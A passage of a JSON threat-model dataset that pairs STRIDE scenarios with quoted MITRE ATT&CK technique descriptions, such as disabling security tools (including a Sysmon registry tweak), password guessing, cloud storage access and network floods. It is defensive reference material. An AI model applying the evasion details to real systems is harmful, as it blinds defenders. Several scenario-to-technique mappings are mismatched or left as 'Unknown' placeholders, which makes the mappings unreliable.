                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny actions performed via their authenticated devices.",
            "Assumptions": [
                {
                    "Assumption": "Activity logs do not capture sufficient detail",
                    "Role": "System Designer",
                    "Condition": "Valid if logging is incomplete"
                },
                {
                    "Assumption": "User authentication methods can be spoofed",
                    "Role": "Attacker",
                    "Condition": "Valid when authentication is weak"
                },
                {
                    "Assumption": "Logs can be altered without detection",
                    "Role": "Attacker",
                    "Condition": "Valid if tampering mechanisms are present"
                }
            ],
            "Potential Impact": "Difficulty in auditing and accountability for malicious actions",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "authentication",
                "logging"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "System logs and audit trails are erased or corrupted.",
            "Assumptions": [
                {
                    "Assumption": "Log data is not protected with adequate controls",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption and access controls are weak"
                },
                {
                    "Assumption": "There's no regular backup of logs",
                    "Role": "IT Administrator",
                    "Condition": "Valid if backup policies are not enforced"
                },
                {
                    "Assumption": "Access to log files is not restricted",
                    "Role": "IT Administrator",
                    "Condition": "Valid when permissions are too broad"
                }
            ],
            "Potential Impact": "Loss of forensic evidence, making incident response difficult",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "False transactions are entered into the system with no traceable source.",
            "Assumptions": [
                {
                    "Assumption": "Transaction systems do not enforce non-repudiation mechanisms",
                    "Role": "System Designer",
                    "Condition": "Valid if system lacks proper validation"
                },
                {
                    "Assumption": "User actions are not individually tracked",
                    "Role": "System Administrator",
                    "Condition": "Valid if shared accounts exist"
                },
                {
                    "Assumption": "Intrusion monitoring is insufficient",
                    "Role": "IT Security",
                    "Condition": "Valid when monitoring does not detect unauthorized transactions"
                }
            ],
            "Potential Impact": "Financial loss or compromise of transaction integrity",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "transaction hijacking",
                "source tracing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data captured by sensors is intercepted over an insecure network.",
            "Assumptions": [
                {
                    "Assumption": "Network communication is not encrypted",
                    "Role": "Network Engineer",
                    "Condition": "Valid if encryption protocols are lacking"
                },
                {
                    "Assumption": "Data is transmitted without validation",
                    "Role": "System Designer",
                    "Condition": "Valid if validation checks are not implemented"
                },
                {
                    "Assumption": "Intrusion detection is inadequate",
                    "Role": "IT Security",
                    "Condition": "Valid when monitoring tools are weak"
                }
            ],
            "Potential Impact": "Leakage of sensitive user information leading to privacy breaches",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud storage holding user data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access controls are weak",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if permissions are broad"
                },
                {
                    "Assumption": "Data encryption at rest is not enforced",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption policies are absent"
                },
                {
                    "Assumption": "Cloud credentials are not regularly updated",
                    "Role": "IT Administrator",
                    "Condition": "Valid if credential rotation policies are not in place"
                }
            ],
            "Potential Impact": "Exposure of sensitive user profiles and configuration data",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "AI and ML models reveal sensitive patterns leading to data leakage.",
            "Assumptions": [
                {
                    "Assumption": "Models are not obfuscated or protected",
                    "Role": "Data Scientist",
                    "Condition": "Valid if model security is weak"
                },
                {
                    "Assumption": "Training data includes sensitive information",
                    "Role": "Data Engineer",
                    "Condition": "Valid if data sanitization is inadequate"
                },
                {
                    "Assumption": "Model outputs are not properly screened",
                    "Role": "System Designer",
                    "Condition": "Valid if outputs are not evaluated for sensitive information"
                }
            ],
            "Potential Impact": "Unintentional disclosure of sensitive user information via model predictions",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "AI models",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on communication infrastructure disrupts service operations.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not monitored for anomalies",
                    "Role": "IT Security",
                    "Condition": "Valid if monitoring tools are weak"
                },
                {
                    "Assumption": "Infrastructure lacks redundancy",
                    "Role": "Network Engineer",
                    "Condition": "Valid if failover mechanisms are absent"
                },
                {
                    "Assumption": "Bandwidth capacity is limited",
                    "Role": "System Administrator",
                    "Condition": "Valid if network resources are insufficient"
                }
            ],
            "Potential Impact": "Disruption of service availability and system operations",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading the smart device interface with requests causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Device capacity is not adequately tested",
                    "Role": "System Tester",
                    "Condition": "Valid if load testing is insufficient"
                },
                {
                    "Assumption": "Rate limiting is not implemented on the interface",
                    "Role": "System Designer",
                    "Condition": "Valid if request throttling is absent"
                },
                {
                    "Assumption": "Anomalous behavior is not logged or alerted",
                    "Role": "IT Security",
                    "Condition": "Valid if monitoring tools are weak"
                }
            ],
            "Potential Impact": "Smart device becomes unresponsive, leading to service interruption",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "interface overload",
                "request flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects user devices, causing them to act as bots in a DDoS attack.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack adequate malware protection",
                    "Role": "User",
                    "Condition": "Valid if antivirus software is weak or absent"
                },
                {
                    "Assumption": "Network does not detect and mitigate botnet activity",
                    "Role": "Network Engineer",
                    "Condition": "Valid when IDS/IPS are weak"
                },
                {
                    "Assumption": "Device vulnerabilities are not patched",
                    "Role": "User",
                    "Condition": "Valid if security updates are not applied"
                }
            ],
            "Potential Impact": "User devices contribute to larger DDoS attacks, affecting service availability",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "botnet",
                "malware"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting unpatched vulnerabilities to gain higher system privileges.",
            "Assumptions": [
                {
                    "Assumption": "System software has known vulnerabilities",
                    "Role": "IT Administrator",
                    "Condition": "Valid if patches are not applied"
                },
                {
                    "Assumption": "Security configurations are not properly hardened",
                    "Role": "System Engineer",
                    "Condition": "Valid if configurations are default or weak"
                },
                {
                    "Assumption": "Monitoring tools do not identify privilege escalation activities",
                    "Role": "IT Security",
                    "Condition": "Valid if detection mechanisms are weak"
                }
            ],
            "Potential Impact": "Attacker gains high-level access, compromising system integrity and confidentiality",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "vulnerability exploitation",
                "system privileges"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware that leverages zero-day vulnerabilities to obtain admin rights.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerabilities are present in critical systems",
                    "Role": "Software Vendor",
                    "Condition": "Valid when vulnerabilities are yet unknown"
                },
                {
                    "Assumption": "Endpoint detection and response mechanisms are inadequate",
                    "Role": "IT Security",
                    "Condition": "Valid if monitoring tools are weak"
                },
                {
                    "Assumption": "Privilege boundary enforcement is insufficient",
                    "Role": "System Designer",
                    "Condition": "Valid if privilege boundaries are poorly defined"
                }
            ],
            "Potential Impact": "Malware gains admin rights, allowing extensive unauthorized access and control",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "zero-day",
                "admin rights"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains administrator access via social engineering techniques.",
            "Assumptions": [
                {
                    "Assumption": "Users fall victim to phishing attacks",
                    "Role": "User",
                    "Condition": "Valid if users are not trained in security awareness"
                },
                {
                    "Assumption": "Multi-factor authentication (MFA) is not enforced",
                    "Role": "System Administrator",
                    "Condition": "Valid if MFA is not implemented"
                },
                {
                    "Assumption": "Roles and permissions are not properly managed",
                    "Role": "IT Administrator",
                    "Condition": "Valid if access controls are weak"
                }
            ],
            "Potential Impact": "Attacker gains admin access through social manipulation, allowing system compromise",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "social engineering",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
}
]